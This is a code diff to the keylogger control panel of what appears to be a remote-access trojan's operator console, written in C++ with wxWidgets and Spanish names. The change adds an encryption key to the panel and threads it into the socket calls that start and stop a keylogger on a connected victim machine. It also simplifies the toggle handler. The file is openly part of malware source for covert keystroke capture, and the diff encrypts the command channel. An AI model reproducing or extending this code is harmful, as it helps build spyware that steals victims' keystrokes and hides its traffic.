@@ -11,11 +11,12 @@ wxBEGIN_EVENT_TABLE(panelKeylogger, wxFrame)
 	EVT_BUTTON(EnumIDS::ID_KL_BTN_Save, panelKeylogger::OnGuardarLog)
 wxEND_EVENT_TABLE()
 
-panelKeylogger::panelKeylogger(wxWindow* pParent, SOCKET sck, std::string _strID) :
+panelKeylogger::panelKeylogger(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key) :
 	wxFrame(pParent, EnumIDS::ID_KL_Panel,"[" + _strID + "] Keylogger") {
 
 	this->SetName(_strID + "-key");
 	this->sckCliente = sck;
+	this->enc_key = c_key;
 	this->SetTitle("[" + _strID.substr(0, _strID.find('/', 0)) + "] Keylogger");
 
 	this->btn_Iniciar = new wxToggleButton(this, EnumIDS::ID_KL_BTN_Toggle, "Iniciar");
@@ -67,16 +68,9 @@ void panelKeylogger::OnLimpiar(wxCommandEvent& event) {
 
 void panelKeylogger::OnToggle(wxCommandEvent& event) {
 	bool isSel = this->btn_Iniciar->GetValue();
-	std::string strComando = "";
-	if (isSel) {
-		//Iniciar keylogger
-		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::KL_Iniciar);
-		this->btn_Iniciar->SetLabelText(wxT("Detener"));
-	}else {
-		//Apagar keylogger
-		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::KL_Detener);
-		this->btn_Iniciar->SetLabelText(wxT("Iniciar"));
-	}
+	int iComando = isSel ? EnumComandos::KL_Iniciar : EnumComandos::KL_Detener;
+	p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, iComando, this->enc_key);
+	this->btn_Iniciar->SetLabelText(isSel ? "Detener" : "Iniciar");
 }
 
 void panelKeylogger::AgregarData(const char*& pBuffer) {
